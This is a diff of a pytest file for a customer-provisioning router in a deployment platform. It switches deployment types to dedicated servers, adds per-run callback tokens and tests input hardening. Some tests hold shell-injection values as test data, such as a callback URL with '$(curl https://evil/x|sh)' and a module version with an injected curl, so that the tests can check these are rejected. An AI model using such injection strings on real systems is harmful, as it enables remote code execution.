@@ -2,6 +2,8 @@
 
 from __future__ import annotations
 
+from dataclasses import replace
+from pathlib import Path
 from types import SimpleNamespace
 
 import pytest
@@ -52,13 +54,7 @@ def _secret_settings(**overrides):
         "secret_encryption_key": Fernet.generate_key().decode("utf-8"),
         "secret_encryption_key_version": "test",
         "bootstrap_secret_ttl_seconds": 3600,
-        "github_owner": "",
-        "github_repo": "",
-        "github_workflow": "provision-customer.yml",
-        "github_ref": "main",
-        "github_dispatch_token": "",
-        "provisioning_callback_key_id": "",
-        "provisioning_callback_key_hash": "",
+        "provisioner_backend": "disabled",
         "provisioning_callback_allowed_hosts": "",
         "is_operator_surface": True,
         "operator_mode": False,
@@ -77,7 +73,7 @@ def test_full_stack_provisioning_separates_private_and_customer_service_spaces()
         owner_user_id="admin@onebrain",
         bundle_id="full_stack",
         deployment_id="dep_acme",
-        deployment_type="dedicated_railway",
+        deployment_type="dedicated_server",
         region="eu-central",
         release_ring="pilot",
         initial_version="2026.07.0",
@@ -124,7 +120,7 @@ def test_communication_bundle_does_not_install_assistant_modules():
         owner_user_id="admin@onebrain",
         bundle_id="onebrain_communication",
         deployment_id="dep_supportco",
-        deployment_type="shared_railway",
+        deployment_type="dedicated_server",
         region="eu-central",
         release_ring="manual",
         initial_version="0.1.0",
@@ -147,7 +143,7 @@ def test_full_stack_provisioning_mints_constrained_integration_keys():
         owner_user_id="admin@onebrain",
         bundle_id="full_stack",
         deployment_id="dep_acme",
-        deployment_type="dedicated_railway",
+        deployment_type="dedicated_server",
         region="eu-central",
         release_ring="pilot",
         initial_version="2026.07.0",
@@ -155,6 +151,14 @@ def test_full_stack_provisioning_mints_constrained_integration_keys():
     )
 
     assert {credential.app_id for credential in result.credentials} == {"assistant", "communication", "kpi_dashboard"}
+    integration_credentials = provisioning_router._box_integration_credentials(result)
+    assert integration_credentials["assistant"][0] == next(
+        credential.key for credential in result.credentials if credential.app_id == "assistant"
+    )
+    assert integration_credentials["communication"][0] == next(
+        credential.key for credential in result.credentials if credential.app_id == "communication"
+    )
+    assert integration_credentials["assistant"][0] != integration_credentials["communication"][0]
 
     assistant = next(credential for credential in result.credentials if credential.app_id == "assistant")
     stored_assistant = service_keys.get(assistant.id)
@@ -210,7 +214,7 @@ def test_kpi_dashboard_bundle_is_selectable_for_new_customers():
         owner_user_id="admin@onebrain",
         bundle_id="onebrain_kpi_dashboard",
         deployment_id="dep_metricsco",
-        deployment_type="dedicated_railway",
+        deployment_type="dedicated_server",
         region="eu-central",
         release_ring="pilot",
         initial_version="2026.07.0",
@@ -244,7 +248,7 @@ def test_ai_employees_bundle_is_selectable_for_new_customers():
         owner_user_id="admin@onebrain",
         bundle_id="onebrain_ai_employees",
         deployment_id="dep_agentco",
-        deployment_type="dedicated_railway",
+        deployment_type="dedicated_server",
         region="eu-central",
         release_ring="pilot",
         initial_version="2026.07.0",
@@ -281,7 +285,7 @@ def test_provisioning_stores_account_brand_and_app_overrides():
         owner_user_id="admin@onebrain",
         bundle_id="full_stack",
         deployment_id="dep_brandco",
-        deployment_type="dedicated_railway",
+        deployment_type="dedicated_server",
         region="eu-central",
         release_ring="pilot",
         initial_version="2026.07.0",
@@ -339,7 +343,7 @@ def test_unknown_app_brand_override_is_rejected_before_writes():
             owner_user_id="admin@onebrain",
             bundle_id="onebrain_only",
             deployment_id="dep_coreonly",
-            deployment_type="dedicated_railway",
+            deployment_type="dedicated_server",
             region="",
             release_ring="manual",
             initial_version="0.1.0",
@@ -376,7 +380,7 @@ def test_duplicate_deployment_blocks_before_platform_records_are_created():
             owner_user_id="admin@onebrain",
             bundle_id="full_stack",
             deployment_id="dep_acme",
-            deployment_type="dedicated_railway",
+            deployment_type="dedicated_server",
             region="",
             release_ring="manual",
             initial_version="0.1.0",
@@ -396,7 +400,7 @@ def test_unknown_module_version_override_is_rejected_before_writes():
             owner_user_id="admin@onebrain",
             bundle_id="onebrain_assistant",
             deployment_id="dep_assistantco",
-            deployment_type="dedicated_railway",
+            deployment_type="dedicated_server",
             region="",
             release_ring="manual",
             initial_version="0.1.0",
@@ -413,6 +417,7 @@ def test_provisioning_router_requires_admin(monkeypatch):
     monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
     monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
     monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: service_keys)
+    monkeypatch.setattr(provisioning_router, "get_settings", lambda: _secret_settings())
 
     with pytest.raises(HTTPException) as exc:
         provisioning_router.provision_customer(
@@ -475,6 +480,9 @@ def test_provisioning_run_callbacks_store_bootstrap_secret_once():
     )
 
     assert succeeded.status == "succeeded"
+    public_run = provisioning_router._run_out(succeeded)
+    assert public_run.target_id == "rail_proj"
+    assert "railway_project_id" not in public_run.model_dump()
     assert succeeded.bootstrap_secret_id.startswith("ots_")
     assert "temporary-admin-password" not in str(succeeded)
     assert read_one_time_secret(store, settings, succeeded.bootstrap_secret_id) == "temporary-admin-password"
@@ -503,12 +511,9 @@ def test_provisioning_run_refuses_stale_and_terminal_callbacks():
         apply_callback(store, settings, run.id, ProvisioningCallback(status="running"))
 
 
-def test_provisioning_callback_endpoint_requires_dedicated_callback_key(monkeypatch):
+def test_provisioning_callback_endpoint_requires_per_run_callback_token(monkeypatch):
     store = MemoryProvisioningRunStore()
-    settings = _secret_settings(
-        provisioning_callback_key_id="cb_1",
-        provisioning_callback_key_hash=hash_callback_secret("callback-secret"),
-    )
+    settings = _secret_settings()
     run = create_run(
         store,
         account_id="acme",
@@ -517,6 +522,10 @@ def test_provisioning_callback_endpoint_requires_dedicated_callback_key(monkeypa
         requested_by="admin",
         payload={},
     )
+    run = store.update_run(replace(
+        run,
+        result_payload={"callback_token_hash": hash_callback_secret("callback-secret")},
+    ))
     monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: store)
     monkeypatch.setattr(provisioning_router, "get_settings", lambda: settings)
 
@@ -525,20 +534,36 @@ def test_provisioning_callback_endpoint_requires_dedicated_callback_key(monkeypa
             run.id,
             provisioning_router.ProvisioningCallbackIn(status="running"),
             authorization="Bearer wrong",
-            x_onebrain_callback_key_id="cb_1",
         )
     assert denied.value.status_code == 401
+
+    with pytest.raises(HTTPException) as missing:
+        provisioning_router.provisioning_callback(
+            "missing-run",
+            provisioning_router.ProvisioningCallbackIn(status="running"),
+            authorization="Bearer callback-secret",
+        )
+    assert missing.value.status_code == 401
 
     accepted = provisioning_router.provisioning_callback(
         run.id,
         provisioning_router.ProvisioningCallbackIn(status="running"),
         authorization="Bearer callback-secret",
-        x_onebrain_callback_key_id="cb_1",
     )
     assert accepted.status == "running"
 
 
-def test_external_provisioning_without_github_config_creates_visible_failed_run(monkeypatch):
+def test_provisioning_callback_rejects_retired_target_coordinate_fields():
+    import pydantic
+
+    with pytest.raises(pydantic.ValidationError, match="Extra inputs are not permitted"):
+        provisioning_router.ProvisioningCallbackIn(
+            status="running",
+            railway_project_id="attacker-selected-target",
+        )
+
+
+def test_external_provisioning_without_hetzner_backend_creates_visible_failed_run(monkeypatch):
     platform, control = _stores()
     service_keys = MemoryServiceKeyStore()
     runs = MemoryProvisioningRunStore()
@@ -563,7 +588,7 @@ def test_external_provisioning_without_github_config_creates_visible_failed_run(
 
     assert created.provisioning_run is not None
     assert created.provisioning_run.status == "dispatch_failed"
-    assert "not configured" in created.provisioning_run.failure_reason
+    assert created.provisioning_run.failure_reason == "Hetzner provisioning is required."
     assert runs.list_runs(account_id="acme")[0].id == created.provisioning_run.id
 
 
@@ -575,6 +600,7 @@ def test_external_provisioning_requires_callback_url_before_writes(monkeypatch):
     monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
     monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: service_keys)
     monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
+    monkeypatch.setattr(provisioning_router, "get_settings", lambda: _secret_settings())
 
     with pytest.raises(HTTPException) as exc:
         provisioning_router.provision_customer(
@@ -590,6 +616,42 @@ def test_external_provisioning_requires_callback_url_before_writes(monkeypatch):
         )
 
     assert exc.value.status_code == 400
+    assert platform.list_accounts() == []
+    assert control.list_deployments() == []
+    assert runs.list_runs() == []
+
+
+def test_external_provisioning_preflight_fails_before_any_writes(monkeypatch):
+    platform, control = _stores()
+    service_keys = MemoryServiceKeyStore()
+    runs = MemoryProvisioningRunStore()
+
+    def reject_preflight():
+        raise RuntimeError("production Mission Control preflight failed")
+
+    settings = _secret_settings()
+    settings.assert_production_mission_control_ready = reject_preflight
+    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
+    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
+    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: service_keys)
+    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
+    monkeypatch.setattr(provisioning_router, "get_settings", lambda: settings)
+
+    with pytest.raises(HTTPException) as exc:
+        provisioning_router.provision_customer(
+            provisioning_router.CustomerProvisionCreate(
+                customer_name="Acme",
+                bundle_id="onebrain_only",
+                account_id="acme",
+                deployment_id="dep_acme",
+                external_provisioning=True,
+                owner_email="owner@example.test",
+                callback_url="https://mc.example/api/provisioning/runs/{run_id}/callback",
+            ),
+            principal=_principal("admin"),
+        )
+
+    assert exc.value.status_code == 409
     assert platform.list_accounts() == []
     assert control.list_deployments() == []
     assert runs.list_runs() == []
@@ -628,7 +690,9 @@ def test_hetzner_provision_customer_assembles_valid_bundle(monkeypatch):
         provisioner_backend="hetzner", hetzner_api_token="tok",
         hetzner_allow_inprocess_broker=True, hetzner_firewall_id="fw1",
         hetzner_volume_size_gb=0, secret_encryption_key="unit-test-secret-key",
-        fleet_url="https://mc.example",
+        fleet_url="https://mc.example", operator_mode=True,
+        fleet_dns_provider="hetzner", fleet_dns_zone_id="zone-1",
+        fleet_base_domain="fleet.example",
     )
     monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
     monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
@@ -668,6 +732,12 @@ def test_hetzner_provision_customer_assembles_valid_bundle(monkeypatch):
     # their box with the same identity. seed.py needs BOTH to seed the admin at first boot.
     assert bundle["ONEBRAIN_ADMIN_EMAIL"] == "owner@acme.example"
     assert bundle["ONEBRAIN_ADMIN_EMAIL"] == owner.email
+    # The persisted, preflighted callback template reaches cloud-init rather
+    # than silently falling back to the fleet URL.
+    assert (
+        f"https://admin.example/api/onebrain/provisioning/runs/"
+        f"{created.provisioning_run.id}/callback"
+    ) in fake.servers[0].user_data
 
 
 def test_hetzner_provision_customer_requires_owner_email(monkeypatch):
@@ -678,7 +748,7 @@ def test_hetzner_provision_customer_requires_owner_email(monkeypatch):
     platform, control = _stores()
     runs = MemoryProvisioningRunStore()
     settings = Settings(provisioner_backend="hetzner", hetzner_api_token="tok",
-                        hetzner_allow_inprocess_broker=True)
+                        hetzner_allow_inprocess_broker=True, operator_mode=True)
     monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
     monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
     monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: MemoryServiceKeyStore())
@@ -726,12 +796,11 @@ def test_retry_rejects_non_failed_provisioning_run(monkeypatch):
     assert len(runs.list_runs()) == 1
 
 
-# --- workflow-injection hardening -------------------------------------------
+# --- external-provisioning input hardening -----------------------------------
 
 def test_provision_create_rejects_shell_injection_in_module_versions():
-    """A module version like "1.0'; curl evil #" must be rejected at the schema
-    boundary so it can never reach the provision-customer workflow's shell/python
-    interpolation (the job holds RAILWAY_TOKEN + the callback key)."""
+    """A module version like "1.0'; curl evil #" is not a valid deployment
+    identifier or release value and must be rejected at the API boundary."""
     import pydantic
 
     with pytest.raises(pydantic.ValidationError):
@@ -753,6 +822,24 @@ def test_provision_create_rejects_injection_in_structural_fields():
             provisioning_router.CustomerProvisionCreate(customer_name="x", **{field: bad})
 
 
+def test_provision_create_rejects_retired_railway_deployment_types():
+    import pydantic
+
+    for deployment_type in ("dedicated_railway", "shared_railway"):
+        with pytest.raises(pydantic.ValidationError):
+            provisioning_router.CustomerProvisionCreate(
+                customer_name="x",
+                deployment_type=deployment_type,
+            )
+
+
+def test_provisioning_form_offers_only_supported_deployment_types():
+    html = (Path(__file__).resolve().parents[1] / "app" / "static" / "index.html").read_text(encoding="utf-8")
+    assert '<option value="dedicated_server" selected>Dedicated server</option>' in html
+    assert 'value="dedicated_railway"' not in html
+    assert 'value="shared_railway"' not in html
+
+
 def test_provision_create_rejects_injection_in_brand_colors():
     import pydantic
 
@@ -768,7 +855,7 @@ def test_provision_create_accepts_legitimate_values():
     colors (customer/brand names remain free text and are intentionally allowed)."""
     ok = provisioning_router.CustomerProvisionCreate(
         customer_name="O'Brien Gym & Co",  # free-text name: quotes/space/& allowed
-        deployment_type="dedicated_railway",
+        deployment_type="dedicated_server",
         region="europe-west1",
         initial_version="2026.07.0",
         current_migration="0015_fleet_telemetry",
@@ -793,6 +880,26 @@ def test_callback_url_rejects_shell_metacharacters(monkeypatch):
                 customer_name="Acme", account_id="acme", deployment_id="dep_acme",
                 external_provisioning=True,
                 callback_url="https://cb.allowed.host/x?a=$(curl https://evil/x|sh)",
+            ),
+            principal=_principal("admin"),
+        )
+    assert exc.value.status_code == 400
+
+
+def test_callback_url_requires_a_run_id_template(monkeypatch):
+    platform, control = _stores()
+    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
+    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
+    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: MemoryServiceKeyStore())
+    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: MemoryProvisioningRunStore())
+    monkeypatch.setattr(provisioning_router, "get_settings", lambda: _secret_settings())
+
+    with pytest.raises(HTTPException, match="run_id") as exc:
+        provisioning_router.provision_customer(
+            provisioning_router.CustomerProvisionCreate(
+                customer_name="Acme", account_id="acme", deployment_id="dep_acme",
+                external_provisioning=True,
+                callback_url="https://cb.allowed.host/provisioning/callback",
             ),
             principal=_principal("admin"),
         )
